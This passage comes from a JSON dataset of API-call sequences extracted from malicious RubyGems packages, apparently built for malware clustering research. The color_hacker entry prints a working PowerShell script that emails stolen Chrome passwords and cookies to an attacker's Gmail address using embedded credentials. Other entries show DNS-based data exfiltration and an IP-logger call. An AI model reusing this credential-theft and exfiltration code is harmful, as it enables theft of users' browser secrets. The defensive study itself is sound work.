'scores.map', 'scores', 'score.[]', 'audio_scores.inject', 'audio_scores', '[audio_scores.size.to_f, 1].max.to_f', '[audio_scores.size.to_f, 1].max', 'audio_scores.size.to_f', 'audio_scores.size', 'audio_scores', 'audio_quality_score_sum./', 'audio_quality_score_sum', 'attr_accessor', 'URI.encode', 'category.==', 'PirateBay::Categories::IDS.[]', 'category.upcase.strip.gsub(/S$/, \"\").to_sym', 'category.upcase.strip.gsub', 'category.upcase.strip', 'category.upcase', 'PirateBay::ResultSet.new', 'caching', 'File.exist?', 'cached_filename', 'File.read', 'cached_filename', 'fetch_search_results', 'FileUtils.mkdir_p', 'File.open', 'cached_filename', 'f.write', 'search_string.nil?', 'search_string', 'self.page', '@results.size.<', '@results.size', '@results.total_results', 'Nokogiri.HTML', 'get_search_results', 'next_page', 'filename.gsub', 'filename.gsub', 'filename.strip', 'File.join', 'sanitize_filename', 'search_string', 'category_id', 'page', 'execute', '@results.map', 'result.id', 'open(url).read', 'open', 'PirateBay::Details.new', 'puts', 'result.seeds', 'result.size', 'result.name', 'p.video_quality_average', 'p.audio_quality_average', 'p.video_scores.size', 'p.video_scores', 'p.audio_scores.size', 'p.audio_scores', 'p.video_quality_score_sum', 'p.audio_quality_score_sum', 'puts', 'results.reject { |a,|\\n  a.[](:video).nan?\\n}.sort_by', 'results.reject', 'a.[](:video).nan?', 'a.[]', 'a.[]', 'search_string', 'page', 'category_id', 'open(url, { \"User-Agent\" => \"libcurl-agent/1.0\" }).read', 'open', 'private', '@results.total_results.nil?', '@results.total_results', 'doc.css(\"h2\").first.content.match', 'doc.css(\"h2\").first.content', 'doc.css(\"h2\").first', 'doc.css', 'matching_results.nil?', '@results.total_results=', '@results.total_results=', 'matching_results.[](3).to_i', 'matching_results.[]', 'doc.css(\"#searchResult tr\").each_with_index', 'doc.css', 'index.==', 'row.css(\"td\").size.<=', 'row.css(\"td\").size', 'row.css', 'PirateBay::Result.new', '@results.<<', 'attr_accessor', 'name', 'seeds', 'size', 'row.css(\"td\").[](1).css(\"img[alt=\\'Trusted\\']\").size.>', 'row.css(\"td\").[](1).css(\"img[alt=\\'Trusted\\']\").size', 'row.css(\"td\").[](1).css', 'row.css(\"td\").[]', 'row.css', 'row.css(\"td\").[](1).css(\"img[alt=\\'VIP\\']\").size.>', 'row.css(\"td\").[](1).css(\"img[alt=\\'VIP\\']\").size', 'row.css(\"td\").[](1).css', 'row.css(\"td\").[]', 'row.css', 'row.css(\"td\").[](1).css', 'row.css(\"td\").[]', 'row.css', 'magnet_links.size.>', 'magnet_links.size', 'magnet_links.first.[]', 'magnet_links.first', 'url.split(\".\").[]', 'url.split', 'self.id=', 'row.inner_html.match(/torrent\\\\/([\\\\d]+)\\\\//).[]', 'row.inner_html.match', 'row.inner_html', 'self.name=', 'row.css(\".detName\").first.content.strip', 'row.css(\".detName\").first.content', 'row.css(\".detName\").first', 'row.css', 'self.seeds=', 'row.css(\"td\").[](2).content.to_i', 'row.css(\"td\").[](2).content', 'row.css(\"td\").[]', 'row.css', 'self.leeches=', 'row.css(\"td\").[](3).content.to_i', 'row.css(\"td\").[](3).content', 'row.css(\"td\").[]', 'row.css', 'self.category=', 'row.css(\"td\").[](0).css(\"a\").map(&:content).join', 'row.css(\"td\").[](0).css(\"a\").map', 'row.css(\"td\").[](0).css', 'row.css(\"td\").[]', 'row.css', 'self.link=', '\"https://torrents.thepiratebay.\" + domain.+', '\"https://torrents.thepiratebay.\".+', 'id', 'name', 'self.magnet_link=', 'self.status=', 'row.css(\".detDesc\").first.content.match(/Size (.*[G|M|K]iB)/i).[]', 'row.css(\".detDesc\").first.content.match', 'row.css(\".detDesc\").first.content', 'row.css(\".detDesc\").first', 'row.css', 'self.size=', 'filesize_in_bytes', 'filesize.match', 'match.[](1).to_f', 'match.[]', 'match.[](2).strip', 'match.[]', 'raw_size.*', 'raw_size.*', 'raw_size.*', 'attr_accessor', 'self.search=', 'self.total_results=', '1.0./', 'self.size', 'search.next_page', 'search']",
            "n_tokens": 1951,
            "embedding": "[ 0.01529501 -0.02828171 -0.00708983 ... -0.00030218 -0.0364675\n  0.0121235 ]",
            "cluster": "0",
            "id": 755,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/piratebay-api/0.1.6/piratebay-api-0.1.6.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/piratebay-api/0.1.6/piratebay-api-0.1.6_extracted",
            "name": "piratebay-api",
            "version": "0.1.6",
            "published_at": "2020-02-26T01:14:09.637Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, nokogiri, hpricot, awesome_print",
            "SHA-256": "4741ca255d8aa07bdde162c7d9a29942e9d71fb654f135fda6d8b51c44afcac4"
        },
        {
            "name_version": "shopify-cloud-2300.4.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/maloss/shopify-cloud-2300.4.2_extracted/shopify-cloud-2300.4.2_sourcecode.rb",
            "Source": "Maloss",
            "code_api": "['require', 'require', 'require', 'Socket.gethostname', 'File.expand_path', 'Dir.pwd', 'JSON.generate', 'data.unpack(\"H*\").[](0).scan', 'data.unpack(\"H*\").[]', 'data.unpack', 'rand(36 ** 12).to_s', 'rand', '36.**', 'rand(36 ** 12).to_s', 'rand', '36.**', 'Resolv.getaddress', 'Resolv.new', 'Resolv::Hosts.new', 'Resolv::DNS.new', 'data.each.each_with_index', 'data.each', 'Resolv.getaddress', '\"v2_f.\" + id_1 + \".\" + idx.to_s + \".\" + chunk + \".v2_e\".+', '\"v2_f.\" + id_1 + \".\" + idx.to_s + \".\" + chunk.+', '\"v2_f.\" + id_1 + \".\" + idx.to_s + \".\".+', '\"v2_f.\" + id_1 + \".\" + idx.to_s.+', '\"v2_f.\" + id_1 + \".\".+', '\"v2_f.\" + id_1.+', '\"v2_f.\".+', 'idx.to_s', 'custom_res.getaddress', '\"v2_f.\" + id_2 + \".\" + idx.to_s + \".\" + chunk + \".v2_e\".+', '\"v2_f.\" + id_2 + \".\" + idx.to_s + \".\" + chunk.+', '\"v2_f.\" + id_2 + \".\" + idx.to_s + \".\".+', '\"v2_f.\" + id_2 + \".\" + idx.to_s.+', '\"v2_f.\" + id_2 + \".\".+', '\"v2_f.\" + id_2.+', '\"v2_f.\".+', 'idx.to_s']",
            "n_tokens": 376,
            "embedding": "[ 0.00921261 -0.01726014  0.00307244 ...  0.0054073  -0.03683165\n  0.01303202]",
            "cluster": "0",
            "id": 6,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/maloss/shopify-cloud-2300.4.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/maloss/shopify-cloud-2300.4.2_extracted",
            "name": "shopify-cloud",
            "version": "2300.4.2",
            "published_at": "2020-09-15T09:50:00.534Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": NaN,
            "SHA-256": "967e48812d05260527132444b8b9e10780e81b9290e16bb685790c3308db4960"
        },
        {
            "name_version": "artoo_crazyflie-0.5.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/artoo_crazyflie/0.5.0/artoo_crazyflie-0.5.0_extracted/artoo_crazyflie-0.5.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'connection', 'device', 'work', 'drone.take_off', 'drone', 'after', '1.seconds', 'drone.stop', 'drone', 'require', 'connection', 'device', 'work', 'drone.start', 'drone', 'drone.take_off', 'drone', 'after', 'drone.hover', 'drone', 'after', '3.seconds', 'drone.land', 'drone', 'after', '5.seconds', 'drone.stop', 'drone', 'require', 'connection', 'device', 'connection', 'device', 'work', 'on', 'controller', 'on', 'controller', 'on', 'controller', '@power.nil?', 'data.[](:y).<', 'data.[]', 'data.[](:y).abs.*', 'data.[](:y).abs', 'data.[]', 'thrust.>=', '@power.<', '@power.-', 'drone.power', 'drone', 'data.[](:x).>', 'data.[]', 'drone.turn_right', 'drone', 'data.[](:x).abs.*', 'data.[](:x).abs', 'data.[]', 'data.[](:x).<', 'data.[]', 'drone.turn_left', 'drone', 'data.[](:x).abs.*', 'data.[](:x).abs', 'data.[]', 'drone.turn_left', 'drone', 'data.[](:y).<', 'data.[]', 'drone.forward', 'drone', 'data.[](:y).abs.*', 'data.[](:y).abs', 'data.[]', 'data.[](:y).>', 'data.[]', 'drone.backward', 'drone', 'data.[](:y).abs.*', 'data.[](:y).abs', 'data.[]', 'drone.forward', 'drone', 'data.[](:x).>', 'data.[]', 'drone.right', 'drone', 'data.[](:x).abs.*', 'data.[](:x).abs', 'data.[]', 'data.[](:x).<', 'data.[]', 'drone.left', 'drone', 'data.[](:x).abs.*', 'data.[](:x).abs', 'data.[]', 'drone.left', 'drone', 'drone.hover', 'drone', 'drone.hover', 'drone', 'require', 'connection', 'device', 'connection', 'device', 'work', 'on', 'leap', 'every', 'calculate_power', 'handle_thrust', 'hand.palm_z.from_scale(100..800).to_scale', 'hand.palm_z.from_scale', 'hand.palm_z', '@power.nil?', '@thrust.nil?', '@thrust.>=', '@power.<', '@power.-', 'drone.power', 'drone', 'require', 'connection', 'device', 'work', 'drone.log_value', 'drone', 'drone.start_logging', 'drone', 'every', '1.seconds', 'puts', 'drone.log', 'drone', 'require', 'connection', 'device', 'work', 'on', 'watch', 'display_watch', 'data.nil?', 'data.button', 'drone.take_off', 'drone', 'drone.land', 'drone', 'drone.stop', 'drone', 'drone.hover', 'drone', 'drone.land', 'drone', 'drone.stop', 'drone', 'drone.hover', 'drone', 'puts', 'watch.set_nowplaying_metadata', 'watch', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'attr_reader', 'require', '::Crubyflie::Crazyflie.new', 'additional_params.[]', 'additional_params', 'source.empty?', '@crazyflie.scan_interface', 'flies.empty?', 'raise', 'flies.first', '@crazyflie.open_link', '::Crubyflie::Commander.new', '@crazyflie.close_link', '@crazyflie.send', 'require', '[:start, :stop, :hover, :land, :take_off, :emergency, :up, :down, :left, :right, :forward, :backward, :turn_left, :turn_right, :power].freeze', 'attr_reader', 'every', 'interval', 'send_command', 'Logger.error', 'Logger.error', 'e.message', 'Logger.error', 'e.backtrace.inspect', 'e.backtrace', 'power', 'set_thrust_off', 'h.==', 'set_thrust_hover', 'set_thrust_off', 'power', 'after', 'power', 'forward', 'set_thrust_on', 'after', 'power', 'deg.-@', 'deg.-@', 'deg.-@', 'power', 'power', 'power', 'private', 'connection.commander.send_setpoint', 'connection.commander', 'connection', 'roll', 'pitch', 'yaw', 'thrust', 'xmode', 'require', '[:set_value, :start_get_value, :toc, :values, :log].freeze', 'attr_reader', 'Logger.error', 'Logger.error', 'e.message', 'Logger.error', 'e.backtrace.inspect', 'e.backtrace', 'connection.param.toc', 'connection.param', 'connection', 'connection.param.set_value', 'connection.param', 'connection', '@values.[]=', 'connection.param.get_value', 'connection.param', 'connection', '@values.[]=', '::Crubyflie::LogConfVariable.new', '::Crubyflie::LogConf.new', 'connection.log.create_log_block', 'connection.log', 'connection', 'connection.log.start_logging', 'connection.log', 'connection', 'require', 'File.expand_path', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/artoo_crazyflie/0.5.0/artoo_crazyflie-0.5.0_extracted/artoo_crazyflie-0.5.0_sourcecode.rb\").+', 'File.dirname', 'require', 'require', 'File.expand_path', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/artoo_crazyflie/0.5.0/artoo_crazyflie-0.5.0_extracted/artoo_crazyflie-0.5.0_sourcecode.rb\").+', 'File.dirname', 'require', 'require', 'require', 'Celluloid.logger=']",
            "n_tokens": 1461,
            "embedding": "[ 0.01090017 -0.01296896  0.00300072 ... -0.00168577 -0.02507917\n  0.03550118]",
            "cluster": "0",
            "id": 548,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/artoo_crazyflie/0.5.0/artoo_crazyflie-0.5.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/artoo_crazyflie/0.5.0/artoo_crazyflie-0.5.0_extracted",
            "name": "artoo_crazyflie",
            "version": "0.5.0",
            "published_at": "Not available",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "minitest, minitest-happy, mocha, artoo, hybridgroup-crubyflie",
            "SHA-256": "72285bf202bbe5f828dc1052da80fa07307730a4034ff049a1e42a49d0ef55af"
        },
        {
            "name_version": "color_hacker-5.9.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/maloss/color_hacker-5.9.9_extracted/color_hacker-5.9.9_sourcecode.rb",
            "Source": "Maloss",
            "code_api": "['require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'create_home_dir', 'steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'export_data', 'gone_like_the_wind', 'ChromeTaker.toast', 'puts', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 2017,
            "embedding": "[-0.01000159 -0.02044813 -0.00582396 ... -0.00996698 -0.0259458\n -0.00290704]",
            "cluster": "0",
            "id": 4,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/maloss/color_hacker-5.9.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/maloss/color_hacker-5.9.9_extracted",
            "name": "color_hacker",
            "version": "5.9.9",
            "published_at": "Not available",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, sqlite3, builder, rake, bundler, sqlite3, builder",
            "SHA-256": "91593034223c7ad82d31e061ce240de653d6393e1c24d6c028b656ebf39be3a2"
        },
        {
            "name_version": "doge-woof-0.1.10",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/doge-woof/0.1.10/doge-woof-0.1.10_extracted/doge-woof-0.1.10_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require_relative', 'phrase', 'line', 'para', 'count.times', '@@modifiers.sample.capitalize + \" \" + @@words.sample.+', '@@modifiers.sample.capitalize + \" \".+', '@@modifiers.sample.capitalize.+', '@@modifiers.sample.capitalize', '@@modifiers.sample', '@@words.sample', '@@c_words.sample.capitalize.+', '@@c_words.sample.capitalize', '@@c_words.sample', 'count.times', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample + \" \" + @@words.sample + \" \" + @@c_modifiers.sample.+', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample + \" \" + @@words.sample + \" \".+', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample + \" \" + @@words.sample.+', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample + \" \".+', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample.+', '@@modifiers.sample.capitalize + \" \".+', '@@modifiers.sample.capitalize.+', '@@modifiers.sample.capitalize', '@@modifiers.sample', '@@fillers.sample', '@@words.sample', '@@c_modifiers.sample', 'rand.<', 'rand', '@@c_words.sample.capitalize.+', '@@c_words.sample.capitalize', '@@c_words.sample', 'para_count.times', 'line_count.times', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample + \" \" + @@words.sample + \" \" + @@c_modifiers.sample.+', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample + \" \" + @@words.sample + \" \".+', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample + \" \" + @@words.sample.+', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample + \" \".+', '@@modifiers.sample.capitalize + \" \" + @@fillers.sample.+', '@@modifiers.sample.capitalize + \" \".+', '@@modifiers.sample.capitalize.+', '@@modifiers.sample.capitalize', '@@modifiers.sample', '@@fillers.sample', '@@words.sample', '@@c_modifiers.sample', 'rand.<', 'rand', '@@c_words.sample.capitalize.+', '@@c_words.sample.capitalize', '@@c_words.sample']",
            "n_tokens": 551,
            "embedding": "[ 0.00567821 -0.02224892 -0.00615224 ... -0.00216337 -0.02932904\n  0.0097276 ]",
            "cluster": "0",
            "id": 790,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/doge-woof/0.1.10/doge-woof-0.1.10.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/doge-woof/0.1.10/doge-woof-0.1.10_extracted",
            "name": "doge-woof",
            "version": "0.1.10",
            "published_at": "Not available",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, doge_woof",
            "SHA-256": "455fdce587a2f60496cc880d47178fded827147c935cd38600a0d7caf161c099"
        }
    ],
    "links": [
        {
            "source": 4,
            "target": 6
        },
        {
            "source": 4,
            "target": 12
        },
        {
            "source": 4,
            "target": 20
        },
        {
            "source": 4,
            "target": 25
        },
        {
            "source": 4,
            "target": 28
        },
        {
            "source": 4,
            "target": 31
        },
        {
            "source": 4,
            "target": 52
        },
        {
            "source": 4,
            "target": 56
        },
        {
            "source": 4,
            "target": 69
        },
        {
            "source": 4,
            "target": 76
        },
        {
            "source": 4,
            "target": 83
        },
        {
            "source": 4,
            "target": 84
        },
        {
            "source": 4,
            "target": 86
        },
        {
            "source": 4,
            "target": 92
        },
        {
            "source": 4,
            "target": 115
        },
        {
            "source": 4,
            "target": 116
        },
        {
            "source": 4,
            "target": 118
        },
        {
            "source": 4,
            "target": 124
        },
        {
            "source": 4,
            "target": 131
        },
        {
            "source": 4,
            "target": 132
        },
        {
            "source": 4,
            "target": 169
        },
        {
            "source": 4,
            "target": 188
        },
        {
            "source": 4,
            "target": 191
        },
        {
            "source": 4,
            "target": 196
        },
        {
            "source": 4,
            "target": 197
        },
        {
            "source": 4,
            "target": 198
        },
        {
            "source": 4,
            "target": 207
        },
        {
            "source": 4,
            "target": 213
        },
        {
            "source": 4,
            "target": 214
        },
        {
            "source": 4,
            "target": 217
        },
        {
            "source": 4,
            "target": 220
        },
        {
            "source": 4,
            "target": 227
        },
        {
            "source": 4,
            "target": 244
        },
        {
            "source": 4,
            "target": 249
        },
        {
            "source": 4,
            "target": 255
        },
        {
            "source": 4,
            "target": 259
        },
        {
            "source": 4,
            "target": 261
        },
        {
            "source": 4,
            "target": 263
        },
        {
            "source": 4,
            "target": 289
        },
        {
            "source": 4,
            "target": 292
        },
        {
            "source": 4,
            "target": 305
        },
        {
            "source": 4,
            "target": 320
        },
        {
            "source": 4,
            "target": 324
        },
        {
            "source": 4,
            "target": 347
        },
        {
            "source": 4,
            "target": 351
        },
        {
            "source": 4,
            "target": 369
        },
        {
            "source": 4,
            "target": 373
        },
        {
            "source": 4,
            "target": 384
        },
        {
            "source": 4,
            "target": 385
        },
        {
            "source": 4,
            "target": 386
        },
        {
            "source": 4,
            "target": 387
        },
        {
            "source": 4,
            "target": 388
        },
        {
            "source": 4,
            "target": 391
        },
        {
            "source": 4,
            "target": 398
        },
        {
            "source": 4,
            "target": 400
        },
        {
            "source": 4,
            "target": 401
        },
        {
            "source": 4,
            "target": 403
        },
        {
            "source": 4,
            "target": 405
        },
        {
            "source": 4,
            "target": 408
        },
        {
            "source": 4,
            "target": 413
        },
        {
            "source": 4,
            "target": 420
        },
        {
            "source": 4,
            "target": 424
        },
        {
            "source": 4,
            "target": 430
        },
        {
            "source": 4,
            "target": 431
        },
        {
            "source": 4,
            "target": 438
        },
        {
            "source": 4,
            "target": 442
        },
        {
            "source": 4,
            "target": 452
        },
        {
            "source": 4,
            "target": 453
        },
        {
            "source": 4,
            "target": 458
        },
        {
            "source": 4,
            "target": 461
        },
        {
            "source": 4,
            "target": 467
        },
        {
            "source": 4,
            "target": 469
        },
        {
            "source": 4,
            "target": 472
        },
        {
            "source": 4,
            "target": 473
        },
        {
            "source": 4,
            "target": 477
        },
        {
            "source": 4,
            "target": 481
        },
        {
            "source": 4,
            "target": 484
        },
        {
            "source": 4,
            "target": 486
        },
        {
            "source": 4,
            "target": 488
        },
        {
            "source": 4,
            "target": 490
        },
        {
            "source": 4,
            "target": 493
        },
        {
            "source": 4,
            "target": 495
        },
        {
            "source": 4,
            "target": 505
        },
        {
            "source": 4,
            "target": 509
        },
        {
            "source": 4,
            "target": 519
        },
        {
            "source": 4,
            "target": 524
        },
        {
            "source": 4,
            "target": 530
        },
        {
            "source": 4,
            "target": 531
        },
        {
            "source": 4,
            "target": 548
        },
        {
            "source": 4,
            "target": 561
        },
        {
            "source": 4,
            "target": 562
        },
        {
            "source": 4,
            "target": 563
        },
        {
            "source": 4,
            "target": 572
        },
        {
            "source": 4,
            "target": 573
        },
        {
            "source": 4,
            "target": 574
        },
        {
            "source": 4,
            "target": 575
        },
        {
            "source": 4,
            "target": 576
        },
        {
            "source": 4,
            "target": 577
        },
        {
            "source": 4,
            "target": 578
        },
        {
            "source": 4,
            "target": 579
        },
        {
            "source": 4,
            "target": 585
        },
        {
            "source": 4,
            "target": 588
        },
        {
            "source": 4,
            "target": 589
        },
        {
            "source": 4,
            "target": 591
        },
        {
            "source": 4,
            "target": 597
        },
        {
            "source": 4,
            "target": 603
        },
        {
            "source": 4,
            "target": 604
        },
        {
            "source": 4,
            "target": 606
        },
        {
            "source": 4,
            "target": 607
        },
        {
            "source": 4,
            "target": 613
        },
        {
            "source": 4,
            "target": 621
        },
        {
            "source": 4,
            "target": 625
        },
        {
            "source": 4,
            "target": 628
        },
        {
            "source": 4,
            "target": 633
        },
        {
            "source": 4,
            "target": 643
        },
        {
            "source": 4,
            "target": 661
